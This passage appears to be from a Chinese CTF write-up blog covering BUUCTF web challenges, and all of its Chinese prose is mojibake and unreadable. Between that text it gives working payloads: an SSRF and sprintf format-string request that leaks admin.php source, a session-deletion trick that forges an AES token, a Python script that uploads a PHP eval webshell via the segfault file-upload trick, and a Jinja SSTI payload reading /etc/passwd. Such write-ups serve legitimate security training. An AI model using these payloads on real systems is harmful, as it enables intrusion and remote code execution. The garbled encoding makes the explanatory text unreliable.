 &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?a.?d.?m.?i.?n.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You! are! not! my! admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ç¦æ­¢å¥—å¨ƒ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/system$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç°åœ¨è®¿é—®çš„æ˜¯ &quot;</span>.$file . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŒæ ·çš„æ–¹å¼å¯ä»¥è¯»å–<code>system.php</code>æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;</span><br><span class="line">$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;</span><br><span class="line">$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;simform-inner&quot;&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;ol class&#x3D;&quot;questions&quot;&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;ä½ çŸ¥é“ç›®å½•ä¸‹éƒ½æœ‰ä»€ä¹ˆæ–‡ä»¶å—?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;è¯·è¾“å…¥ä½ æƒ³æ£€æµ‹æ–‡ä»¶å†…å®¹é•¿åº¦çš„url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;ä½ å¸Œæœ›ä»¥ä½•ç§æ–¹å¼è®¿é—®ï¼ŸGETï¼ŸPOST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ol&gt;</span><br><span class="line">            &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;æäº¤&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;controls&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;number&quot;&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">				&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@é¢–å¥‡L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var theForm &#x3D; document.getElementById( &#39;theForm&#39; );</span><br><span class="line"></span><br><span class="line">    new stepsForm( theForm, &#123;</span><br><span class="line">        onSubmit : function( form ) &#123;</span><br><span class="line">            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );</span><br><span class="line">            var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; );</span><br><span class="line">            form.submit();</span><br><span class="line">            messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;;</span><br><span class="line">            classie.addClass( messageEl, &#39;show&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>é‡ç‚¹å…³æ³¨ååŠæ®µPHPä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°ä»¥ä¸‹çš„é™åˆ¶æ¡ä»¶ï¼š</p>
<p>1.ä¸èƒ½åŒ…å«æœ‰flagå­—ç¬¦ä¸²</p>
<p>2.q2çš„å€¼å¿…é¡»ä»¥<code>http://127.0.0.1/</code>å¼€å¤´ï¼Œå…¶å®ç›¸å½“äºæ˜¯é™åˆ¶äº†åªèƒ½é€šè¿‡SSRFè¯»å–æ–‡ä»¶</p>
<p>3.POSTè·å–äº†q1ã€q2ã€q3ä¸‰ä¸ªå€¼ï¼Œå…¶ä¸­q1å€¼å¹¶æ²¡æœ‰ä»€ä¹ˆé™åˆ¶ï¼Œq2åä¼šæ‹¼æ¥â€œ.y1ng.txtâ€å­—ç¬¦ä¸²ï¼Œq3ä¸­éœ€è¦ä»¥GETæˆ–POSTå­—ç¬¦ä¸²å¼€å¤´ã€‚</p>
<p>é¦–å…ˆæ˜¯æ— æ³•ç›´æ¥è¯»å–åˆ°flagæ–‡ä»¶ï¼Œé€šè¿‡home.phpæ–‡ä»¶çš„æºç æˆ‘ä»¬å¯ä»¥çŒœæµ‹åº”è¯¥è¿˜å­˜åœ¨admin.phpæ–‡ä»¶ã€‚å…¶æ¬¡å°±æ˜¯æˆ‘ä»¬ä¼ è¿›å»çš„URLå³q2å€¼ä¼šè¢«æ‹¼æ¥ä¸Šæ— ç”¨å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨URLååŠ  â€œ?a=(GETèµ‹å€¼ç»™ä¸€ä¸ªå‚æ•°)â€ æˆ– â€œ#(é”šç‚¹)â€ æ¥è®©å…¶å¤±æ•ˆï¼Œ</p>
<p>æœ€åä¸€ä¸ªè€ƒçš„ç‚¹å°±æ˜¯åœ¨è¿™ä¸¤è¡Œä»£ç ä¸Šï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$detect = @file_get_contents($url, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, $detect));</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç‰µæ‰¯åˆ°äº†å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–çš„çŸ¥è¯†ï¼Œ%dä¼šå°†$detectä»¥äºŒè¿›åˆ¶æ•°çš„å½¢å¼è¾“å‡ºï¼Œæ‰€ä»¥å¹¶ä¸èƒ½å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„æºç ã€‚</p>
<p>è€Œä¸»è¦æ€è·¯å°±æ˜¯è®©$detectä»¥å­—ç¬¦ä¸²å½¢å¼ï¼ˆ%sï¼‰æ¥è¾“å‡ºï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§è¯»å–admin.phpæºç çš„æ–¹æ³•ï¼š</p>
<ul>
<li><code> %1$s</code> â€”â€” è¿™ç§åŠæ³•åŸç†æ˜¯<code>%1$s</code>ä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°ç”¨stringç±»å‹è¾“å‡ºï¼Œè€Œè¿™é“é¢˜ä¸­ç¬¬ä¸€ä¸ªå‚æ•°ä¾¿æ˜¯admin.phpçš„æºç ï¼Œè¯­å¥æ˜¯ï¼š</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%1$s%d&quot;, $detect));  &#x2F;&#x2F; %1$sä¼šä»¥å­—ç¬¦ä¸²æ ¼å¼è¾“å‡º$detectï¼Œè€Œ%dä¼šè¾“å‡º0</span><br></pre></td></tr></table></figure>
<ul>
<li><code>%s% </code>â€”â€” è¿™ç§åŠæ³•çš„åŸç†æ˜¯sprintf()å‡½æ•°ä¸­%å¯ä»¥è½¬ä¹‰æ‰%ï¼Œè¿™æ ·è¯­å¥å°±å˜æˆäº†ï¼š</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%s%%d&quot;, $detect));  &#x2F;&#x2F; %då‰çš„%è¢«è½¬ä¹‰</span><br></pre></td></tr></table></figure>
<p>æ„é€ å‡ºPayloadï¼ŒPOSTå‘é€ç»™system.phpå³å¯è·å¾—<code>admin.php</code>çš„æºç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q1&#x3D;1&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php#&amp;q3&#x3D;GET%1$s </span><br></pre></td></tr></table></figure>
<p><code>admin.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">&#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>] === md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>] === sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;user&#x27;</span>] = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;decrypt&#x27;</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">&#x27;decrypt&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag_2sln2ndln2klnlksnf.php&#x27;</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;çˆ¬&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">&#x27;secret&#x27;</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä»£ç ä¸­ç¬¬ä¸€å±‚ifå¾ªç¯elseä»£ç å—ä¸­çš„mt_srandéšæœºæ•°æ˜¯çœŸéšæœºæ•°ï¼Œä¸èƒ½çˆ†ç ´ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªTrickï¼š</p>
<blockquote>
<p>sessionç»•è¿‡ã€‚åˆ é™¤cookieï¼Œæ²¡æœ‰cookieä¸­çš„SESSIONIDå°±æ‰¾ä¸åˆ°å¯¹åº”çš„sessionæ–‡ä»¶ï¼Œç›¸åº”çš„$_SESSION[â€˜varâ€™]å°±ä¸ºNULLï¼Œç›¸å½“äºä¼ å‚NULLã€‚</p>
<p><a href="https://www.jianshu.com/p/9c031dee57b7">https://www.jianshu.com/p/9c031dee57b7</a></p>
</blockquote>
<p>æ‰€ä»¥åªè¦æˆ‘ä»¬åœ¨è®¿é—®admin.phpæ—¶ï¼Œåˆ é™¤sessionè®¿é—®ï¼Œä»£ç å°±ä¼šå˜æˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cipher &#x3D; aesEn(&#39;&#39;, &#39;y1ng&#39;);</span><br></pre></td></tr></table></figure>
<p>å› æ­¤æˆ‘ä»¬å°±å¯ä»¥è®¡ç®—å‡ºå¯†é’¥ï¼Œä»è€Œè·å¾—Flagã€‚</p>
<p>æŠŠåŠ å¯†ç®—æ³•æ”¹ä¸€ä¸‹å¾—åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function aesEn($data, $key)&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5(&#39;174.0.0.2&#39;,true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo aesEn(&#39;&#39;, &#39;y1ng&#39;)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712125104.png" alt=""></p>
<h2 id="NPUCTF2020-ezinclude">NPUCTF2020 ezinclude</h2>
<h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3>
<ul>
<li>æ–‡ä»¶åŒ…å«</li>
<li>php Segfault</li>
</ul>
<h3 id="è§£é¢˜-v6">è§£é¢˜</h3>
<p>ä¸€è¿›æ¥æç¤º uername/password errorï¼Œçœ‹çš„æˆ‘ä¸€è„¸æ‡µé€¼ã€‚æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹cookie</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155251.png" alt=""></p>
<p>ç›´æ¥ç»™äº†Hashå€¼ï¼ŒGETå‚æ•°pass=Hashå€¼ã€‚</p>
<p>è·³è½¬åˆ°404é¡µé¢ï¼Œä½†æ˜¯ä¸­é—´æ˜æ˜¾æœ‰ä¸€ä¸ªlocationé‡å®šå‘ï¼Œç”¨bpé‡æ”¾ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155451.png" alt=""></p>
<p>å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒPHPä¼ªåè®®è¯»ç‰©æ–‡ä»¶</p>
<p>index.php</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155706.png" alt=""></p>
<p>flflflflag.php</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155752.png" alt=""></p>
<p>æŸ¥çœ‹PHPç‰ˆæœ¬7.0.3ï¼Œå¯ä»¥ä½¿ç”¨PHP Segfaultä¸Šä¼ shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">file_data = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">b&quot;&lt;?php eval($_POST[cmd]);&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://db4c33c0-8231-45b5-8aec-dbcadfeb8704.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url=url, files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
<p>flagåœ¨phpinfoä¸­ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921160053.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>æ–‡ä»¶åŒ…å«</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”Python</title>
    <url>/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python/</url>
    <content><![CDATA[<h1 id="BUUCTFåˆ·é¢˜â€”â€”Python">BUUCTFåˆ·é¢˜â€”â€”Python</h1>
<h2 id="GYCTF2020-flaskapp">GYCTF2020 flaskapp</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>
<p>Flask debug pinç å®‰å…¨</p>
<p><a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p>
</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<p>æ‰“å¼€é¢˜ç›®æœ‰ä¸€ä¸ªhintç•Œé¢ï¼ŒæŸ¥çœ‹æºç </p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706152201.png" alt=""></p>
<p>æ„æ€åº”è¯¥æ˜¯å»ä¼ªé€ Flask pinç„¶åæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>å…ˆæ¥éªŒè¯ä¸€ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[0].__init__&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706160510.png" alt=""></p>
<p>ç„¶åè¿˜è¦æ‰¾åˆ°ä¸€ä¸ªè¯»æ–‡ä»¶çš„payloadï¼Œå‘ç°evalä¸èƒ½ç”¨ï¼Œç”¨openå¯ä»¥è¯»</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706160627.png" alt=""></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è¦è·å–6ä¸ªå…³é”®å‚æ•°</p>
